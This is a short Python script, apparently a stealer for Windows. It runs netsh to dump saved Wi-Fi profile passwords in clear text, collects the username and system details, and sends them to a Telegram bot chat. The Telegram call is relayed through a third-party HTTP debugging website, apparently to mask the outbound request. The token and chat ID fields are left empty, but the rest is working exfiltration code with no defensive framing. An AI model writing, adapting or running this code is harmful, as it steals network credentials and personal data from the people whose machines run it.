import requests
import platform
import subprocess
import time

info_system = platform.uname()

WifiList = []
data = subprocess.check_output(['netsh',
                                'wlan', 'show', 'profiles']).decode('utf-8').split('\n')

profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

for i in profiles:
    results = subprocess.check_output(['netsh',
                                       'wlan', 'show', 'profiles', i,
                                       'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]

    try:
        WifiList.append("{:<30}|  {:<}".format(i, results[0]))
    except IndexError:
        WifiList.append("{:<30}|  {:<}".format(i, ""))

username_info = subprocess.getoutput('echo %username%')

msg = f"""
🆕 New Request :

🟢 STARTED APP 🟢

🆗 Username 🆗
{username_info}

ℹ System info ℹ
{info_system}

🔑 Wifi Password 🔑
{WifiList}

⏱ Time ⏱
{time.ctime()}

🟢 ENDED APP 🟢
"""
token = ""
ChatId = ""

url = (
    f"https://api.telegram.org/bot{token}/sendmessage?chat_id={ChatId}&text={msg}")

payload = {"UrlBox": url,
           "AgentList": "Mozilla Firefox",
           "VersionsList": "HTTP/1.1",
           "MethodList": "POST"
           }

try:
    req = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", payload)
    print(req)
except Exception:
    print("No Internet Error : Please Connect Internet")
